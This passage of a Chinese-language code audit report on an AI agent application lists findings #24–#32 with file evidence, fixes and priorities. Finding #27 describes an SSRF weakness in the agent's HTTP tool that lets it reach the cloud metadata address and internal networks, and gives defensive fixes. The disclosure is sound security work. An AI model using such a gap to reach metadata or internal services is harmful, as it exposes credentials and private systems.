  7. `StreamChat` 生成 traceID 写入 ctx，包装处提取传入；关键路径补 slog；
  8. `InitOrUpdate` 刷新 active 会话 Settings，或 `BuildRunner` 直接读当前 cfg。
- **影响范围**：各自独立，覆盖失败语义、确定性、可观测性、配置生效。
- **风险说明**：均为局部改动；第 4 项引入新依赖需评估包体积。
- **验证方式**：逐子项单测（超时路径、temp=0、工具名解析、schema 校验、traceID 落库非 NULL）。
- **优先级**：**P1**（其中 exec_command/traceID/Settings 快照为一行级修复，可立即实施）

---

## Suggestions（P2 为主）

### #25 迭代上限与预算熔断不可配置

- **校验结论**：✅ 确认存在。`agent/session.go` L135 `MaxIterations: 100` 硬编码，无 token 预算。
- **推荐修复**：接入 AppSettings；超限时注入"预算耗尽，请总结进展"收尾指令而非硬断。
- **风险说明**：低。**验证**：配置上限为 3 观察收尾行为。**优先级**：**P2**

### #26 工具结果无统一截断策略

- **校验结论**：✅ 确认存在（本次补验 read_file）。`agent/tools/bus.go` L23-32 `ToolResult.String()` 无上限；`agent/tools/workspace.go` `read_file` 直接 `os.ReadFile` 全量读入（L264），不传行区间即全量返回；shell/http/job 各自为政。
- **推荐修复**：`ToolBus.Invoke` 出口统一施加 maxOutputChars（如 30KB），截断附 `truncated:true` 与总长度提示；read_file 额外限制单文件读取字节上限。
- **风险说明**：截断可能破坏依赖完整输出的工具链（如 base64 下载）——对二进制类工具加白名单豁免。
- **验证**：读取 1MB 文件断言输出 ≤30KB 且带截断标记。**优先级**：**P2**

### #27 http_request_readonly 无 SSRF 内网防护

- **校验结论**：✅ 确认存在。`agent/tools/http.go` L36-66 无目标地址校验，可直连 169.254.169.254（云元数据）、127.0.0.1、内网段。虽为 Suggestion，但因涉及信息泄露面，建议按 P1 处理。
- **推荐修复**：请求前解析 DNS，拒绝环回/私网/链路本地/元数据地址；自定义 `DialContext` 二次校验解析后 IP；重定向每一跳复检；默认禁止 `file://` 等非 http(s) scheme。
- **风险说明**：用户可能需要访问内网服务——提供"允许内网"设置项（默认关），并与 #7 的设置接线统一。
- **验证**：单测断言 169.254.169.254 / 10.x / 127.x 被拒。**优先级**：**P1**

### #28 "语义记忆"实为 SQL LIKE 且不自动注入

- **校验结论**：✅ 确认存在。`agent/store/store.go` L745-754 `content LIKE '%query%'`（本次复核确认）；召回仅发生在模型显式调用 memory_recall 时。
- **推荐修复**：短期——记忆写入时抽取关键词入 tags，查询时多关键词 OR；长期——sqlite-vec 向量检索；`buildSchemaMessages` 对 user 消息自动注入 top-3 记忆。
- **风险说明**：自动注入占用上下文预算，需与 #18 压缩策略协同。**验证**：同义改写查询的召回率对比。**优先级**：**P2**

### #29 事件系统三轨并行、命名混乱、含死分支

- **校验结论**：✅ 确认存在（本次补验前端）。
  - `agent/events/events.go` L30 `EventAskUser = "ask_user"`（snake_case）与其余 CamelCase 混用；L32 `EventError = "Error"`；
  - 前端 `useAgentEvents.ts` L461 仅 `case 'error'`（小写）——后端发出的 `"Error"` 事件**永不命中**，错误展示完全依赖 promise rejection 兜底，死分支确认；
  - 三轨分发确认：ChatChunk 走 `agent:chunk:{sid}` legacy 通道（前端 L55 订阅）、ReasoningChunk 走统一流、`agent:event:{sid}` 前端无订阅（L111 仅订阅全局 `agent:event`）。
- **推荐修复**：统一 snake_case 常量；单一 `agent:event` 流 + 显式 payload schema（含 session_id/turn_id）；前端保留一段双 case 兼容期后删除 legacy 通道；后端补发 `error` 事件（小写）修复死分支。
- **风险说明**：事件契约变更影响前端多处 switch——灰度方式：先后端双发，再前端迁移，最后删 legacy。
- **验证**：人为制造 LLM 错误，断言 UI 通过 error 事件（而非仅 promise rejection）展示。**优先级**：**P2**

### #30 会话级 workspace 契约未兑现

- **校验结论**：✅ 确认存在。`agent/runtime.go` L269-279 `SessionItem.Workspace` 落库/读取，但所有工具共享全局唯一 `WorkspaceManager`，切换会话不切换沙箱目录。
- **推荐修复**：`BuildRunner` 按 `Session.Workspace` 实例化 per-session WorkspaceManager（可加 LRU 缓存避免重复扫描）。
- **风险说明**：per-session 实例增加内存；工作区索引需惰性构建。**验证**：双会话配置不同 workspace，断言 read_file 解析互不串扰。**优先级**：**P2**

### #31 每次发送全量重建 Runner + 重复注册约 40 个工具

- **校验结论**：✅ 确认存在。`agent/agent.go` L360-364 每次 `StreamChat` 重建；`services/agent_service.go` L43-46 工具注册随每次重建重复执行。
- **推荐修复**：以配置指纹（BaseURL/Key/Model/Prompt/skills/workspace 哈希）为重建条件；工具注册改 once + 引用计数。
- **风险说明**：缓存失效条件需覆盖 #24-8 的 Settings 变更，否则与快照问题互相放大。**验证**：连续发送 10 条消息，断言 Runner 仅构建一次（日志/计数）。**优先级**：**P2**

### #32 其余建议（合并条目，7 个子项全部确认）

| 子项 | 证据 | 推荐修复 |
|------|------|---------|
| Plan.NeedConfirm 计算后无人消费 | `agent/planner/planner.go` L238 | 低风险计划 auto-approve，高风险强制审批（与 #7 开关联动） |
| subagent_send 未设 Timeout | `agent/tools/orchestration.go`（注册无 Timeout → 走 bus 默认 30s） | 设 5–10 分钟或改异步提交+查询 |
| mqtt_subscribe_once 契约与实现不符 | `agent/tools/mqtt.go` L47-61 只持久订阅并返回成功 | 实现"订阅后等 N 秒收集再取消"的一次性语义 |
| web_search 响应体读取无上限 | `agent/tools/websearch.go` L66 `io.ReadAll`（http.go 的 100KB LimitReader 可参照） | 加 `io.LimitReader` |
| Wait 以 100ms 轮询 SQLite | `agent/job/job.go` L328-356、`agent/subagent/subagent.go` L292-354 | 终态向 per-ID channel 发信号，Wait 改 select channel+超时 |
| ToolBus.Invoke 对非 Invokable 工具静默返回成功 | `agent/tools/bus.go` L220-237 else 分支 | 显式报"工具不支持同步调用" |
| Plan 报告双写竞态 | `services/agent_service.go` L252-269 后端 AddMessage 与前端 ReplaceMessages（先 DELETE 全部）竞争 | 消息持久化收敛为后端 append-only，前端只读 |

- **校验结论**：✅ 全部确认存在。
- **风险说明**：各自局部；Wait 改 channel 需与 #16 的 map 回收协同（channel 需随终态清理）。
- **验证方式**：逐子项单测/手测；双写竞态可通过并发保存消息复现并断言行数一致。
- **优先级**：**P2**

---

## 附：建议实施顺序

1. **第一批（P0，能力真实性与安全）**：#1（生命周期，其余后台类修复的前置）→ #2/#3（注入与伪只读）→ #4+#6（子代理工具循环与递归防护需同批）→ #5（workflow 接入 RunWorkflow）→ #7（设置接线）。
2. **第二批（P1，失败语义与稳定性）**：#13/#14（失败语义统一）→ #8/#9（会话单飞与身份路由）→ #10/#11/#20（崩溃/竞态）→ #12/#15/#16 → #21/#23/#27 → #24 一行级修复（exec_command、traceID、Temperature）。
3. **第三批（P2，收敛与体验）**：#17（随 #16 同批更经济）→ #29（事件契约迁移）→ #18/#25/#26/#28/#30/#31/#32。

> 误报登记：本次复核未发现完全误报条目。#9 前端过滤器"恒真"的表述已修正为"默认会话下全放行"；#14 由"确认存在"修正为"部分存在"（tool_call 空步骤路径已被 executor 拦截）。后续审查请直接引用本文档结论，避免重复核对。
